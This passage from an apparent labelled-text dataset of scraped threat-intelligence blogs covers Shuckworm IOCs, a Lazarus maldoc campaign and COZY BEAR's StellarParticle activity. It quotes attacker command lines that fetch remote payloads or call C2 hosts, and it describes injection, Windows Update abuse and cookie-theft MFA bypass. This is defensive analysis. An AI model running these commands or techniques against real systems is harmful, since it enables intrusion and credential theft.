Dec, 20219 Min ReadNoberus: Technical Analysis Shows Sophistication of New Rust-based Ransomware Symantec Enterprise Blogs SubscribeFollowtwitterlinkedinPrivacy PolicyCookie PolicyData Processing and Data TransfersSupplier ResponsibilityTerms of UseSitemapCopyright © 2005-2022 Broadcom.",
                "The term \"Broadcom\" refers to Broadcom Inc. and/or its subsidiaries.Get Symantec's Latest Blog Posts In Your Inbox I accept the Terms of Use.",
                "Your privacy is important to us.",
                "Please see our Privacy Policy for more information."
            ],
            "sentencesNum": 96,
            "words": [
                "Shuckworm activity: Case study",
                "July 14",
                "wscript.exe CSIDL_PROFILE\\searches\\depended.lnk //e:VBScript //b",
                "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\roaming\\reflect.rar //e:VBScript //b",
                "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\deep-thoughted.",
                "//e:VBScript //b",
                "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\22333.docx //e:VBScript //b",
                "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\9140.d //e:VBScript //b",
                "wscript.exe CSIDL_COMMON_MUSIC\\tvplaylist.mov //e:VBScript //b",
                "\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_PROFILE\\appdata\\roaming\\battery\\battery.cmd",
                "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\12382.",
                "//e:VBScript //b",
                "CSIDL_SYSTEM\\mshta.exe hxxp://avirona.ru/7-ZIP.html /f id=<?,?>",
                "July 16",
                "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\32440.docx //e:VBScript //b",
                "\"CSIDL_SYSTEM\\wscript.exe\" CSIDL_PROFILE\\appdata\\local\\temp\\20507.d //e:VBScript //b",
                "CSIDL_SYSTEM\\cmd.exe /c \"\"CSIDL_PROFILE\\appdata\\local\\temp\\7zsfx000.\"\"",
                "\"\"",
                "\"CSIDL_SYSTEM\\cmd.exe\" /c ipconfig /flushdns",
                "July 28",
                "\"%USERPROFILE%\\Contacts\\DriversHood.exe\" -autoreconnect -id:2097 -connect mucoris.ru:5612",
                "1ddc9b873fe4f4c8cf8978b6b1bb0e4d9dc07e60ba188ac6a5ad8f162d2a1e8f",
                "ad1f796b3590fcee4aeecb321e45481cac5bc022500da2bdc79f768d08081a29",
                "Technical descriptions",
                "descend.exe",
                "%USERPROFILE%\\Downloads\\deerbrook.ppt",
                "%PUBLIC%\\Pictures\\deerbrook.ppt",
                "The binary is then deleted.",
                "deep-sunken.exe",
                "%APPDATA%\\baby\\baby.cmd",
                "%APPDATA%\\baby\\baby.dat",
                "%APPDATA%\\baby\\basement.exe (wget binary)",
                "%APPDATA%\\baby\\vb_baby.vbs",
                "z4z05jn4.egf.exe",
                "defiant.exe",
                "%TEMP%\\\\deep-versed.nls",
                "%PUBLIC\\Pictures\\deep-versed.nls",
                "%PUBLIC%\\Downloads",
                "deep-green.exe",
                "-autoreconnect -id:%RANDOM% -connect mucoris.ru:5612",
                "deep-green.exe",
                "deep-green.exe",
                "deep-green.exe",
                "%PUBLIC%\\Music\\",
                "mshta.exe hxxp://PLAZMA.VIBER.ontroma.ru/PLAZMA.html /f id=January",
                "IOC patterns",
                "http + IP + /<some-word>.php?<some-word>=<1-integer>,<5-7-rand-alphanums>-<2-integers>",
                "csidl_profile\\links",
                "csidl_profile\\searches",
                "CSIDL_PROFILE\\appdata\\local\\temp\\",
                "CSIDL_PROFILE\\",
                "Examples include:",
                "deceive.exe",
                "deceived.exe",
                "deception.exe",
                "deceptive.exe",
                "decide.exe",
                "decided.exe",
                "decipher.exe",
                "decisive.exe",
                "deep-sunken.exe",
                "deep-vaulted.exe",
                "Protection/Mitigation",
                "Indicators of Compromise (IOCs)",
                "All Rights Reserved.",
                "Subscribe SubmittedClose"
            ],
            "wordsNum": 66,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        },
        {
            "time": "2022-01-27",
            "from_website": "MalwareBytes",
            "title": "North Korea’s Lazarus APT leverages Windows Update client, GitHub in latest campaign",
            "from_url": "https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/",
            "content": [
                "North Korea's Lazarus APT leverages Windows Update client, GitHub in latest campaign | Malwarebytes Labs",
                "The official Malwarebytes logo in a blue font",
                "Protect your devices, your data, and your privacy—at home or on the go.",
                "Endpoint Detection & Response for Servers",
                "CLOUD-BASED SECURITY MANAGEMENT AND SERVICES PLATFORM",
                "Find the right solution for your business",
                "See what Malwarebytes can do for you",
                "Our team is ready to help.",
                "\"Thanks to the Malwarebytes MSP program, we have this high-quality product in our stack.",
                "It’s a great addition, and I have confidence that customers’ systems are protected.\"",
                "Activate Malwarebytes Privacy on Windows device.",
                "Level Up to Cloud-Based Business Protection.",
                "North Korea’s Lazarus APT leverages Windows Update client, GitHub in latest campaign",
                "Posted: January 27, 2022 by Threat Intelligence Team",
                "How one of North Korea's most sophisticated APTs tries to avoid detection by using legitimate tools during its attacks.",
                "This blog was authored by Ankur Saini and Hossein Jazi",
                "Lazarus Group is one of the most sophisticated North Korean APTs that has been active since 2009.",
                "The group is responsible for many high profile attacks in the past and has gained worldwide attention.",
                "The Malwarebytes Threat Intelligence team is actively monitoring its activities and was able to spot a new campaign on Jan 18th 2022.",
                "In this campaign, Lazarus conducted spear phishing attacks weaponized with malicious documents that use their known job opportunities theme.",
                "We identified two decoy documents masquerading as American global security and aerospace giant Lockheed Martin.",
                "In this blog post, we provide technical analysis of this latest attack including a clever use of Windows Update to execute the malicious payload and GitHub as a command and control server.",
                "We have reported the rogue GitHub account for harmful content.",
                "The two macro-embedded documents seem to be luring the targets about new job opportunities at Lockheed Martin:",
                "The compilation time for both of these documents is 2020-04-24, but we have enough indicators that confirm that they have been used in a campaign around late December 2021 and early 2022.",
                "Some of the indicators that shows this attack operated recently are the domains used by the threat actor.",
                "Both of the documents use the same attack theme and have some common things like embedded macros but the full attack chain seems to be totally different.",
                "The analysis provided in the blog is mainly based on the “Lockheed_Martin_JobOpportunities.docx” document but we also provide brief analysis for the second document (Salary_Lockheed_Martin_job_opportunities_confidential.doc) at the end of this blog.",
                "The below image shows the full attack process which we will discuss in detail in this article.",
                "The attack starts by executing the malicious macros that are embedded in the Word document.",
                "The malware performs a series of injections and achieves startup persistence in the target system.",
                "In the next section we will provide technical details about various stages of this attack and its payload capabilities.",
                "Macros: Control flow hijacking through KernelCallbackTable",
                "The above code uses a very unusual and lesser known technique to hijack the control flow and execute malicious code.",
                "The malware retrieves the address of the “WMIsAvailableOffline” function from “wmvcore.dll”, then it changes the memory protection permissions for code in “WMIsAvailableOffline” and proceeds to overwrite the code in memory with the malicious base64 decoded shell-code.",
                "Another interesting thing happening in the above code is the control flow hijacking through the KernelCallbackTable member of the PEB.",
                "A call to NtQueryInformationProcess is made with ProcessBasicInformation class as the parameter which helps the malware to retrieve the address of PEB and thus retrieving the KernelCallbackTable pointer.",
                "KernelCallbackTable is initialized to an array of callback functions when user32.dll is loaded into memory, which are used whenever a graphical call (GDI) is made by the process.",
                "To hijack the control flow, malware replaces the USER32!_fnDWORD callback in the table with the malicious WMIsAvailableOffline function.",
                "Once the flow is hijacked and malicious code is executed the rest of the code takes care of restoring the KernelCallbackTable to its original state.",
                "The shellcode loaded by the macro contains an encrypted DLL which is decrypted at runtime and then manually mapped into memory by the shellcode.",
                "After mapping the DLL, the shellcode jumps to the entry point of that DLL.",
                "The shellcode uses some kind of custom hashing method to resolve the APIs.",
                "We used hollows_hunter to dump the DLL and reconstruct the IAT once it is fully mapped into memory.",
                "The hashing function accepts two parameters: the hash of the DLL and the hash of the function we are looking for in that DLL.",
                "A very simple algorithm is used for hashing APIs.",
                "The following code block shows this algorithm:",
                "hash = 2 * (hash + (ord(name[i]) | 0x60))",
                "The shellcode and all the subsequent inter-process Code/DLL injections in the attack chain use the same injection method as described below.",
                "The injection function is responsible for resolving all the required API calls.",
                "It then opens a handle to the target process by using the OpenProcess API.",
                "It uses the SizeOfImage field in the NT header of the DLL to be injected into allocated space into the target process along with a separate space for the init_dll function.",
                "The purpose of the init_dll function is to initialize the injected DLL and then pass the control flow to the entry point of the DLL.",
                "One thing to note here is a simple CreateRemoteThread method is used to start a thread inside the target process unlike the KernelCallbackTable technique used in our macro.",
                "Figure 6: Target Process Injection through CreateRemoteThread",
                "stage1_winword.dll",
                "This is the DLL which is mapped inside the Word process.",
                "This DLL is responsible for restoring the original state of KernelCallbackTable and then injecting stage2_explorer.dll into the explorer.exe process.",
                "Figure 7: Restoring KernelCallbackTable to original state",
                "stage2_explorer.dll",
                "The winword.exe process injects this DLL into the explorer.exe process.",
                "With brief analysis we find out that the .data section contains two additional DLLs.",
                "We refer to them as drops_lnk.dll and stage3_runtimebroker.dll.",
                "By analyzing stage2_explorer.dll a bit further we can easily understand the purpose of this DLL.",
                "The above code snippet shows the main routine of stage2_explorer.dll.",
                "As you can see it checks for the existence of “C:\\Wíndows\\system32\\wuaueng.dll” and then if it doesn’t exist it takes its path to drop additional files.",
                "It executes the drops_lnk.dll in the current process and then tries to create the RuntimeBroker process and if successful in creating RuntimeBroker, it injects stage3_runtimebroker.dll into the newly created process.",
                "If for some reason process creation fails, it just executes stage3_runtimebroker.dll in the current explorer.exe process.",
                "drops_lnk.dll",
                "This DLL is loaded and executed inside the explorer.exe process, it mainly drops the lnk file (WindowsUpdateConf.lnk) into the startup folder and then it checks for the existence of wuaueng.dll in the malicious directory and manually loads and executes it from the disk if it exists.",
                "The lnk file (WindowsUpdateConf.lnk) executes “C:\\Windows\\system32\\wuauclt.exe” /UpdateDeploymentProvider C:\\Wíndows\\system32\\wuaueng.dll /RunHandlerComServer.",
                "This is an interesting technique used by Lazarus to run its malicious DLL using the Windows Update Client to bypass security detection mechanisms.",
                "With this method, the threat actor can execute its malicious code through the Microsoft Windows Update client by passing the following arguments: /UpdateDeploymentProvider, Path to malicious dll and /RunHandlerComServer argument after the dll.",
                "stage3_runtimebroker.dll",
                "This DLL is responsible for creating the malicious directory (“C:\\Wíndows\\system32\\”) and then drops the wuaueng.dll in that directory, furthermore it sets the attributes of the directory to make it hidden.",
                "wuaueng.dll",
                "This is one of the most important DLLs in the attack chain.",
                "This malicious DLL is signed with a certificate which seems to belong to “SAMOYAJ LIMITED”, Till 20 January 2022, the DLL had (0/65) AV detections and presently only 5/65 detect it as malicious.",
                "This DLL has embedded inside another DLL which contains the core module (core_module.dll) of this malware responsible for communicating with the Command and Control (C2) server.",
                "This DLL can be loaded into memory in two ways:",
                "If drops_lnk.dll loads this DLL into explorer.exe then it loads the core_module.dll and then executes it– If it is being executed from wuauclt.exe, then it retrieves the PID of explorer.exe and injects the core_module.dll into that process.",
                "The Core module and GitHub as a C2",
                "Rarely do we see malware using GitHub as C2 and this is the first time we’ve observed Lazarus leveraging it.",
                "Using Github as a C2 has its own drawbacks but it is a clever choice for targeted and short term attacks as it makes it harder for security products to differentiate between legitimate and malicious connections.",
                "While analyzing the core module we were able to get the required details to access the C2 but unfortunately it was already cleaned and we were not able to get much except one of the additional modules loaded by the core_module.dll remotely (thanks to @jaydinbas who shared the module with us).",
                "Figure 13: core_module.dll C2 communication loop",
                "There seems to be no type of string encoding used so we can clearly see the strings which makes the analysis easy.",
                "get_module_from_repo uses the hardcoded username, repo_name, directory, token to make a http request to GitHub and retrieves the files present in the “images” directory of the repository.",
                "The HTTP request retrieves contents of the files present in the repository with an interesting validation which checks that the retrieved file is a PNG.",
                "The file that was earlier retrieved was named “readme.png”; this PNG file has one of the malicious modules embedded in it.",
                "The strings in the module reveal that the module’s original name is “GetBaseInfo.dll”.",
                "Once the malware retrieves the module it uses the map_module function to map the DLL and then looks for an exported function named “GetNumberOfMethods” in the malicious module.",
                "It then executes GetNumberOfMethods and saves the result obtained by the module.",
                "This result is committed to the remote repo under the metafiles directory with a filename denoting the time at which the module was executed.",
                "This file committed to the repo contains the result of the commands executed by the module on the target system.",
                "To commit the file the malware makes a PUT HTTP request to Github.",
                "This was the only module which we were able to get our hands on.",
                "Only a single module does limit us in finding all the capabilities this malware has.",
                "Also its a bit difficult to hunt for these modules as they never really touch the disk which makes them harder to detect by AVs.",
                "The only way to get the modules would be to access the C2 and download the modules while they are live.",
                "Coming back to this module, it has very limited capabilities.",
                "It retrieves the Username, ComputerName and a list of all the running processes on the system and then returns the result so it can be committed to the C2.",
                "Figure 15: GetBaseInfo module retrieving the information",
                "The account with the username “DanielManwarningRep” is used to operate the malware.",
                "The account was created on January 17th, 2022 and other than this we were not able to find any information related to the account.",
                "Figure 16: Account details from the token used",
                "Second Malicious Document used in the campaign",
                "The initial attack vector used in this document is similar to the first document but the malware dropped by the macro is totally different.",
                "Sadly, the C2 for this malware was down by the time we started analyzing it.",
                "This document uses KernelCallbackTable as well to hijack the control flow just like our first module, the injection technique used by the shellcode also resembles the first document.",
                "The major difference in this document is that it tries to retrieve a remote HTML page and then executes it using mshta.exe.",
                "The remote HTML page is located at https[:]//markettrendingcenter[.]com/member.htm and throws a 404 Not Found which makes it difficult for us to analyze this document any further.",
                "There are multiple indicators that suggest that this campaign has been operated by the Lazarus threat actor.",
                "In this section we provide some of the indicators that confirm the actor behind this attack is Lazarus:",
                "Using job opportunities as template is the known method used by Lazarus to target its victims.",
                "The documents created by this actor are well designed and contain a large icon for a known company such as LockHeed Martin, BAE Systems, Boeing and Northrop Grumman in the template.",
                "In this campaign the actor has targeted people that are looking for job opportunities at Lockheed Martin.",
                "Targeting the defense industry and specifically Lockheed Martin is a known target for this actor.The document’s metadata used in this campaign links them to several other documents used by this actor in the past.",
                "Figure 18: Attribution based on metadata",
                "Using Frame1_Layout for macro execution and using lesser known API calls for shellcode execution is known to be used by Lazarus.",
                "We also were able to find infrastructure overlap between this campaign and past campaigns of Lazarus (Figure 19).",
                "Figure 19: Connection with past campaigns",
                "Lazarus APT is one of the advanced APT groups that is known to target the defense industry.",
                "The group keeps updating its toolset to evade security mechanisms.",
                "In this blog post we provided a detailed analysis about the new campaign operated by this actor.",
                "Even though they have used their old job theme method, they employed several new techniques to bypass detections:",
                "Use of KernelCallbackTable to hijack the control flow and shellcode executionUse of the Windows Update client for malicious code executionUse of GitHub for C2 communication",
                "Patchwork APT caught in its own web",
                "January 7, 2022 - The Patchwork APT, an Indian group targeting Pakistan exposes themselves with their own RAT",
                "November 18, 2021 - The FBI has revealed that APT actors have been abusing a zero-day in FatPipe's MPVPN, WARP, and IPVPN products since May.",
                "A multi-stage PowerShell based attack targets Kazakhstan",
                "November 12, 2021 - We uncover a new attack delivered via a number of PowerShell scripts to deploy Cobalt Strike.",
                "FBI and CISA warn of APT groups exploiting ADSelfService Plus",
                "September 17, 2021 - APT actors are exploiting a recently-discovered flaw in ManageEngine's self-service password management product.",
                "Kimsuky APT continues to target South Korean government using AppleSeed backdoor",
                "June 1, 2021 - Kimsuky, the North Korean threat actor active since 2012, is still targeting the South Korean government.",
                "We take a look at the phishing infrastructure and command and control mechanisms of this APT.",
                "Cybersecurity info you can't do without",
                "Want to stay informed on the latest news in cybersecurity?",
                "Sign up for our newsletter and",
                "how to protect your computer from threats.",
                "3979 Freedom Circle, 12th FloorSanta Clara, CA 95054",
                "One Albert Quay, 2nd FloorCork T12 X8N6Ireland",
                "Your intro to everything relating to cyberthreats, and how to stop them.",
                "You must be logged in to post a comment."
            ],
            "sentencesNum": 145,
            "words": [
                "The official Malwarebytes logo",
                "B",
                "We research.",
                "You level up.",
                "Personal",
                "Personal",
                "Security & Antivirus",
                "Malwarebytes for Windows",
                "Malwarebytes for Mac",
                "Malwarebytes for Chromebook",
                "Malwarebytes Browser Guard",
                "Overview",
                "Security & Antivirus for Mobile",
                "Malwarebytes for Android",
                "Malwarebytes for iOS",
                "Online Privacy",
                "Malwarebytes Privacy VPN",
                "Get Started",
                "Explore all Personal Products",
                "Explore Pricing",
                "Free Trial of Malwarebytes Premium",
                "Get free trial",
                "Business",
                "Business",
                "Solutions",
                "BY COMPANY SIZE",
                "Small Business  1-99 Employees",
                "Mid-size Businesses  100-999 Employees",
                "Large Enterprise  1000+ Empoyees",
                "BY INDUSTRY",
                "Education",
                "Finance",
                "Healthcare",
                "Products",
                "NEXT-GEN ANTIVIRUS FOR SMALL BUSINESSES",
                "For Teams",
                "ENTERPRISE-CLASS PROTECTION, DETECTION, AND REMEDIATION",
                "Endpoint Protection",
                "Endpoint Detection & Response",
                "Incident Response",
                "Remediation for CrowdStrike®",
                "ADVANCED SERVER PROTECTION",
                "Endpoint Protection for Servers",
                "Nebula",
                "Get Started",
                "See business pricing",
                "Don't know where to start?",
                "Help me choose a product",
                "Get a free trial",
                "Call us now",
                "+1-800-520-2796",
                "Pricing",
                "Partners",
                "Partners",
                "Explore Partnerships",
                "Partner Solutions",
                "Resellers",
                "Managed Service Providers",
                "Computer Repair",
                "Technology Partners",
                "Partner Success Story",
                "Marek Drummond",
                "Managing Director at Optimus Systems",
                "See full story",
                "Resources",
                "Resources",
                "Learn About Cybersecurity",
                "Antivirus",
                "Malware",
                "Ransomware",
                "See all",
                "Malwarebytes Labs",
                "Explore",
                "Business Resources",
                "Reviews",
                "Analyst Reports",
                "Case Studies",
                "See all",
                "Press & News",
                "Learn more",
                "Events",
                "Featured Event: RSA 2021",
                "See Event",
                "Support",
                "Support",
                "Technical Support",
                "Support",
                "Premium Services",
                "Forums",
                "Vulnerability Disclosure",
                "Training for Personal Products",
                "Training for Business Products",
                "Featured Content",
                "See Content",
                "FREE DOWNLOAD",
                "CONTACT US",
                "COMPANY",
                "Company",
                "About Malwarebytes",
                "Careers",
                "News & Press",
                "SIGN IN",
                "Sign In",
                "My Account",
                "Cloud Console",
                "Partner Portal",
                "SUBSCRIBE",
                "Save 25% Today >",
                "Threat Intelligence",
                "Last updated: February 9, 2022",
                "Analysis",
                "Lockheed_Martin_JobOpportunities.docxSalary_Lockheed_Martin_job_opportunities_confidential.doc",
                "Figure 1: Document Preview",
                "Attack Process",
                "Figure 2: Attack Process",
                "Figure 3: Macros Snippet",
                "Figure 4: KernelCallbackTable in memory",
                "Shellcode Analysis",
                "Figure 5: API resolving",
                "def string_hashing(name):",
                "hash = 0",
                "for i in range(0, len(name)):",
                "return hash",
                "Code Injection",
                "Malware Components",
                "Figure 8: stage2_explorer main routine",
                "Figure 9: Startup folder path",
                "Figure 10: WindowsUpdateConf lnk",
                "Figure 11: stage3_runtimebroker main routine",
                "Figure 12: wuaueng.dll main routine",
                "Figure 14: get_module_from_repo function",
                "Additional Modules (GetBaseInfo.dll)",
                "GitHub Account",
                "Malicious Document",
                "Salary_Lockheed_Martin_job_opportunities_confidential.doc (0160375e19e606d06f672be6e43f70fa70093d2a30031affd2929a5c446d07c1)",
                "Figure 17: Shellcode",
                "Attribution",
                "Conclusion",
                "IOCs:",
                "Maldocs:0d01b24f7666f9bccf0f16ea97e41e0bc26f4c49cdfb7a4dabcc0a494b44ec9b Lockheed_Martin_JobOpportunities.docx0160375e19e606d06f672be6e43f70fa70093d2a30031affd2929a5c446d07c1Salary_Lockheed_Martin_job_opportunities_confidential.docDomains:markettrendingcenter.comlm-career.comPayloads:",
                "NameSha256readme.png4216f63870e2cdfe499d09fce9caa301f9546f60a69c4032cb5fb6d5ceb9af32wuaueng.dll829eceee720b0a3e505efbd3262c387b92abdf46183d51a50489e2b157dac3b1stage1_winword.dllf14b1a91ed1ecd365088ba6de5846788f86689c6c2f2182855d5e0954d62af3b   stage2_explorer.dll660e60cc1fd3e155017848a1f6befc4a335825a6ae04f3416b9b148ff156d143drops_lnk.dll11b5944715da95e4a57ea54968439d955114088222fd2032d4e0282d12a58abbstage3_runtimebroker.dll9d18defe7390c59a1473f79a2407d072a3f365de9834b8d8be25f7e35a76d818core_module.dllc677a79b853d3858f8c8b86ccd8c76ebbd1508cc9550f1da2d30be491625b744GetBaseInfo.dll5098ec21c88e14d9039d232106560b3c87487b51b40d6fef28254c37e4865182",
                "Related",
                "SHARE THIS ARTICLE",
                "COMMENTS",
                "RELATED ARTICLES",
                "Threat Intelligence",
                "CONTINUE READINGNo Comments",
                "Exploits and vulnerabilities",
                "Patch now!",
                "FatPipe VPN zero-day actively exploited",
                "CONTINUE READINGNo Comments",
                "Threat Intelligence",
                "CONTINUE READINGNo Comments",
                "Exploits and vulnerabilities",
                "CONTINUE READINGNo Comments",
                "Threat Intelligence",
                "CONTINUE READINGNo Comments",
                "ABOUT THE AUTHOR",
                "Threat Intelligence Team",
                "Contributors",
                "Threat Center",
                "Podcast",
                "Glossary",
                "Scams",
                "Write for Labs",
                "learn",
                "Imagine a world without malware.",
                "We do.",
                "FOR",
                "PERSONAL",
                "FOR",
                "BUSINESS",
                "COMPANY",
                "ABOUT",
                "US",
                "CAREERS",
                "NEWS AND",
                "PRESS",
                "MY ACCOUNT",
                "SIGN",
                "IN",
                "CONTACT US",
                "GET",
                "SUPPORT",
                "CONTACT",
                "SALES",
                "English",
                "Legal",
                "Privacy",
                "Accessibility",
                "Terms of Service",
                "©",
                "All Rights Reserved",
                "Select your language",
                "Cybersecurity basics",
                "Loading Comments..."
            ],
            "wordsNum": 196,
            "labels": [
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                "",
                ""
            ]
        },
        {
            "time": "2022-01-27",
            "from_website": "CrowdStrike",
            "title": "Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign",
            "from_url": "https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/",
            "content": [
                "StellarParticle Campaign: Novel Tactics and Techniques | CrowdStrike",
                "Early Bird Catches the Wormhole: Observations from the StellarParticle Campaign",
                "StellarParticle, an adversary campaign associated with COZY BEAR, was active throughout 2021 leveraging novel tactics and techniques in supply chain attacks observed by CrowdStrike incident responders",
                "January 27, 2022 CrowdStrike Services - CrowdStrike Intelligence",
                "StellarParticle is a campaign tracked by CrowdStrike as related to the SUNSPOT implant from the SolarWinds intrusion in December 2020 and associated with COZY BEAR (aka APT29, “The Dukes”).Â",
                "The StellarParticle campaign has continued against multiple organizations, with COZY BEAR using novel tools and techniques to complete their objectives, as identified by CrowdStrike incident responders and the CrowdStrike Intelligence team.",
                "Browser cookie theft and Microsoft Service Principal manipulation are two of the novel techniques and tools leveraged in the StellarParticle campaign and are discussed in this blog.",
                "Two sophisticated malware families were placed on victim systems in mid-2019: a Linux variant of GoldMax and a new implant dubbed TrailBlazer.",
                "Supply chain compromises are an increasing threat that impacts a range of sectors, with threat actors leveraging access to support several motivations including financial gain (such as with the Kaseya ransomware attack) and espionage.",
                "Throughout 2020, an operation attributed to the Foreign Intelligence Service of the Russian Federation (SVR) by the U.S. government was conducted to gain access to the update mechanism of the SolarWinds IT management software and use it to broaden their intelligence collection capabilities.",
                "This activity is tracked by CrowdStrike as the StellarParticle campaign and is associated with the COZY BEAR adversary group.",
                "This blog discusses the novel tactics and techniques leveraged in StellarParticle investigations conducted by CrowdStrike.",
                "Credential hopping for obscuring lateral movement",
                "Office 365 (O365) Service Principal and Application hijacking, impersonation and manipulation",
                "Stealing browser cookies for bypassing multifactor authentication",
                "Use of the TrailBlazer implant and the Linux variant of GoldMax malware",
                "The majority of StellarParticle-related investigations conducted by CrowdStrike have started with the identification of adversary actions within a victim’s O365 environment.",
                "This has been advantageous to CrowdStrike incident responders in that, through investigating victim O365 environments, they could gain an accurate accounting of time, account and source IP address of adversary victimization of the O365 tenant.",
                "In multiple engagements, this led CrowdStrike incident responders to identify that the malicious authentications into victim O365 tenants had originated from within the victimâs own network.",
                "Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.",
                "These authentications would typically occur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controller or other infrastructure server?",
                "What credentials were used as part of the session from which the O365 authentication occurred?",
                "This led our responders to identify the occurrence of âcredential hopping,” where the threat actor leveraged different credentials for each step while moving laterally through the victim’s network.",
                "While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim.Â",
                "Below is an example of how a threat actor performs credential hopping:Â",
                "Gain access to the victim’s network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities.",
                "Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account.",
                "From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrator’s account.",
                "Log in to O365 as a user with privileged access to cloud resources.",
                "This technique could be hard to identify in environments where defenders have little visibility into identity usage.",
                "In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.",
                "However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.",
                "A solution such as CrowdStrike FalconÂ® Identity Threat Detection would help identify these anomalous logons â and especially infrequent destinations for accounts.",
                "(Read how CrowdStrike incident responders leverage the module in investigations in this blog: Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.)",
                "But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike?",
                "Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.",
                "The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.",
                "In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.",
                "The user-specific encryption keys for DPAPI are stored under C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\.",
                "To leverage these encryption keys, the threat actor must first decrypt them, either by using the user accountâs Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers.",
                "Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the userâs DPAPI key.",
                "The cookies were then added to a new session using a âCookie Editorâ Chrome extension that the threat actor installed on victim systems and removed after using.",
                "Shellbags, Falcon Telemetry and RDP Bitmap Cache",
                "From a forensic standpoint, the use of the Cookie Editor Chrome extension would have been challenging to identify, due to the threat actorâs penchant for strict operational security.",
                "This activity was identified via a NewScriptWritten event within Falcon when a JavaScript file was written to disk by a threat actor-initiated Chrome process.",
                "This event captured the unique extension ID associated with the extension, thereby allowing CrowdStrike incident responders to validate via the Chrome Store that the JavaScript file was associated with the âCookie Editorâ plugin.",
                "This extension permitted bypassing MFA requirements, as the cookies, replayed through the Cookie Editor extension, allowed the threat actor to hijack the already MFA-approved session of a targeted user.",
                "Shellbags were also instrumental in identifying the cookie theft activity.",
                "This artifact very clearly showed the threat actor accessing targeted usersâ machines in sequence and browsing to the Chrome and DPAPI directories one after another.",
                "Parsing Shellbags for an administrative account leveraged by the threat actor resulted in entries similar to the below.",
                "Shellbag artifacts showing targeting of Chrome directories",
                "CrowdStrike identified forensic evidence that showed the entire attack path: browsing to a target userâs Chrome and DPAPI directories via administrative share, installing the Cookie Editor extension, and using Chrome to impersonate the targeted user in the victimâs cloud tenants.",
                "The decryption of the cookies is believed to have taken place offline after exfiltrating the data via the clipboard in the threat actorâs RDP session.",
                "Representation of lateral movement to cookie theft to O365 authentication",
                "CrowdStrike identified a similar TTP where the threat actor connected via RDP to a userâs workstation with the workstation ownerâs account (e.g., connecting via RDP to user1-pc using the account user1).",
                "In cases where the user had only locked their screen and not signed out, the threat actor was able to take over the userâs Windows session, as the RDP session would connect to the existing session of the same user.",
                "By examining RDP Bitmap Cache files, CrowdStrike was able to demonstrate that the threat actor had opened Chrome and exported all of the userâs saved passwords as plaintext in a CSV file during these sessions.",
                "RDP Bitmap Cache reconstruction showing exportation of Chrome passwords",
                "In addition, the threat actor visited sensitive websites that the user had access to, which in one instance allowed them to browse and download a victimâs customer list.",
